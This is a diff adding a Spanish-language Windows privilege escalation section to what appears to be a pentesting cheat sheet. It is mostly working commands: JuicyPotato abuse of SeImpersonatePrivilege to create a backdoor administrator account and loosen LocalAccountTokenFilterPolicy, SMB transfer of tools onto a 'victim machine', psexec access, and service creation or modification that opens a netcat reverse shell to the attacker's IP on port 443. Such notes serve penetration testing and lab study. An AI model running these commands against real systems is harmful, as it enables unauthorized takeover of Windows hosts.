@@ -269,6 +269,75 @@ wget http://<ip-address/linPEAS.sh			# Desde la máquina víctima
 chmod +x linPEAS.sh
 ./linPEAS.sh
 ```
+<br>
+## ESCALADA DE PRIVILEGIOS EN WINDOWS.
+## whoami /priv.
+Este comando te permite ver los privilegios que tiene asignado el usuario actual.<br>
+En caso de que el usuario tenga asignado el privilegio SeImpersonatePrivilege puedes llegar a escalar privilegios haciendo uso de la herramienta juicypotato.exe que se encuentra en github.<br>Lo que hace el juicypotato.exe es crear un usuario y despues lo asigna al grupo Administrator para que tenga los privilegios maximos dentro del sistema.<br>
+Primero te descargas el juicypotato a tu equipo, luego con la herramienta smbserver te compartes un recurso que este sincronizado con la ruta actual de trabajo y le das soporte a la versión 2 de smb para no tener problemas con la versión del sistema operativo. Te diriges a una ruta que tenga capacidad de escritura y copias el juicypotato.exe especificanfo tu ip-address, el nombre del archivo que quieres copiar y con que nombre lo quieres almacenar en el equipo.
+```
+sudo impacket-smbserver smbFolder $(pwd) smb2support	
+
+cd C:\Windows\Temp
+copy \\<ip-address>\smbFolder\juicypotato.exe jp.exe
+```
+Lo siguiente será crear un usuario con una contraseña para agregarlo al grupo Administrators y retocar el registro LocalAccountTokenFilterPolicy para que el usuario creado pueda ganar acceso como administrador.
+```
+jp.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net user <username> <password> /add" -l 1337
+jp.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators <username> /add" -l 1337
+jp.exe -t * -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -l 1337
+net user <username> 	# Comando para ver que el usuario creado se haya añadido al grupo Administrators.
+```
+<br>
+Despues hay que comprobar que el usuario creado con el juicypotato sea un usuario del sistema con los privilegios de administrador para despues conectarte con psexec.py al sistema como el usuario NT Authority\System.
+```
+crackmapexec smb -u '<username>' '<password>'	# Si como output te sale un pwn3d! es por que el usuario es administrador del sistema
+
+psexec.py WORKGROUP/<username>@<ip-address> cmd.exe
+```
+Si no puedes conectarte con psexec.py significa que los recursos compartidos a nivel de red no tienen permisos de escritura y tendras que crear uno.<br>
+Te creas un recurso compartido y lo sincronizas con la ruta actual de trabajo garantizando que los usuarios que pertenezcan al grupo Administrators tengan privilegios totales sobre el recurso compartido y vuelves a ejecutar el psexec.py.
+```
+jp.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net share smbFolder=C:\Windows\Temp /GRANT:Administratos.FULL" -l 1337
+
+psexec.py WORKGROUP/<username>@<ip-address> cmd.exe
+```
+<br>
+## net user \<username\>.
+Ver a que grupos pertenece un usuario.
+- Si el usuario pertenece al grupo Server Operator se pueden crear, iniciar y detener procesos para escalar privilegios.<br>Crear un proceso (servicio) para que cuando se inicie te envíe una reverse shell a tu equipo por el puerto 443.
+
+
+```
+sudo rlwrap ncat -nlvp 443	# Ponerte en escucha para recibir la reverse shell.
+
+sc.exe create reverseShell binPath="C:\Windows\Temp\nc.exe -e cmd <ip-address> 443"
+# reverseShell es el nombre del proceso.
+# binPath es la ruta donde se encuentra el nc.exe.
+```
+Tranferir el nc.exe a la máquina víctima.
+```
+impacket-smbserver smb smbFolder $(pwd) smb2support	# Desde tu equipo.
+copy \\<ip-address>\smbFolder\nc.exe			# Desde la máquina víctima.
+
+upload /ruta/donde/esta/el/nc.exe	# Forma de subir el nc.exe en caso de haber ganado acceso por winrm.
+```
+- Sino puedes crear un proceso o servicio puedes ver que procesos hay y modificar uno existente. Tendrías que ir probando uno a uno para ver cual puede ser modificado.<br>Una vez modificado un proceso tienes que detener el proceso y volverlo a iniciar y ponerte en escucha con ncat para que cuando se inicie el proceso te envie la reverse shell.
+
+
+```
+services	# Ver los procesos que se estan ejecutando.
+sc.exe config <name_process> binPath="C:\Windows\Temp\nc.exe -e cmd <ip-address> 443"
+# <name_process> es el nombre del proceso que quieres modificar.
+
+sc.exe stop <name_process>	# Detener un servicio.
+
+sudo ncat -nlvp 443		# Desde tu equipo.
+
+sc.exe start <name_process>	# Iniciar un servicio.
+```
+<br>
+## whoamin /all.
 
 
 
